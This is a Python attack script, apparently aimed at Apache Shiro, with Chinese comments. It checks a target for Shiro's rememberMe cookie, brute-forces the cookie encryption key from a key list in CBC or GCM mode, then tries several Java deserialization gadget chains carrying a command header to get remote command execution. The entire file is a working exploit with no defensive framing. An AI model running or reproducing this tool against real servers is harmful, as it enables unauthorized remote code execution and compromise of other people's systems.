import requests
import argparse
import base64
from urllib import parse
from Utils import GCMCipher, CBCCipher
from get_echo.get_echo import echo_payload
import time

'''请求工具方法'''
def RequestUtils(url,data,rememberMe):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:80.0) Gecko/20100101 Firefox/80.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': rememberMe,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies = {}
    data = parse.urlencode(data).encode('utf-8')
    req = requests.post(url, data=data, headers=headers, proxies=proxies, verify=False, allow_redirects=False, timeout=10)
    return req

'''判断存在利用点'''
def JudgeExist(url):
    data = {"classData": "111"}
    rememberMe = 'rememberMe=1'
    try:
        if (RequestUtils(url,data,rememberMe).headers['Set-Cookie'].__contains__('rememberMe=deleteMe')):
            print('---存在shiro框架！---')
            return True
        else:
            print('---未发现shiro框架！---')
            return False
    except Exception as e:
        print('---未发现shiro框架！---')

'''爆破密钥'''
def GetKey(url, ciphertype):
    data = {"classData": "111"}
    rememberMe = 'rememberMe=1'
    checkdata = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
    r1 = RequestUtils(url, data, rememberMe)
    rsp1 = len(str(r1.headers))
    keys = []
    with open('get_key/keys.txt', 'r', encoding='utf-8') as f:
        for line in f:
            keys.append(line.strip())
    try:
        for key in keys:
            # print("[-] start key: {0}".format(key))
            if ciphertype == 'CBC':
                payload = CBCCipher(key, base64.b64decode(checkdata))
            if ciphertype == 'GCM':
                payload = GCMCipher(key, base64.b64decode(checkdata))

            payload = payload.decode()
            # print(payload)
            rememberMe = 'rememberMe='+payload
            r = RequestUtils(url, data, rememberMe)  # 发送验证请求
            rsp = len(str(r.headers))
            if rsp1 != rsp and r.status_code != 400:
                print("!! Get key: {0}".format(key))
                return key
                break
        else:
            print("未发现正确的key")
            return False
    except Exception as e:
        print(e)
        return False

'''爆破构造链'''
def GetGadget(url, ciphertype, key):
    data = {"classData": "111"}
    proxies = {}
    cmd = 'echo testShiro'
    assemblys = ['CommonsBeanutils1Echo', 'CommonsCollections2Echo', 'CommonsCollections3Echo', 'CommonsCollections4Echo', 'CommonsCollections9Echo']
    for assembly in assemblys:
        payload = echo_payload(ciphertype, assembly, key)
        time.sleep(5)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:80.0) Gecko/20100101 Firefox/80.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'cmd' : cmd,
            'Cookie': 'rememberMe='+payload
        }
        req = requests.post(url, data=data, headers=headers, proxies=proxies, verify=False, allow_redirects=False, timeout=10)
        print(req.content)
        try:
            if ('testShiro' in req.content.decode()):
                print('---{}---'.format(assembly))
                return assembly
                break
            else:
                print('---未发现构造链！---')
                return False
        except Exception as e:
            print('---未发现构造链！---')


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-U', '--url', help="target url", required=True)
    parser.add_argument('-T', '--ciphertype', help='CipherType, GCM or CBC', required=True)
    args = parser.parse_args()
    url = args.url
    ciphertype = args.ciphertype

    if JudgeExist(url) == True:
        key = GetKey(url, ciphertype)
        print(key)
        if key == False:
            exit()
        else:
            print("开始爆破构造链")
            GetGadget(url, ciphertype, key)

    # 爆破key
    #     key = Key1.encode_rememberme(url, encrypt_type)
    #     # 遍历字节码
    #     for dir in GenPayload.Getdir():
    #         # 生成payload
    #         payload = GenPayload.Genpayload(dir, key)
    #         tmp = dir[dir.rfind("/") + 1:]
    #         tmp_list = tmp.split("-")
    #         chain = tmp_list[0]
    #         version = tmp_list[1]
    #         print('利用链探测中...请稍等...')
    #         res = SleepTest(url,chain,version,payload)
    # else:
    #     print('探测结束')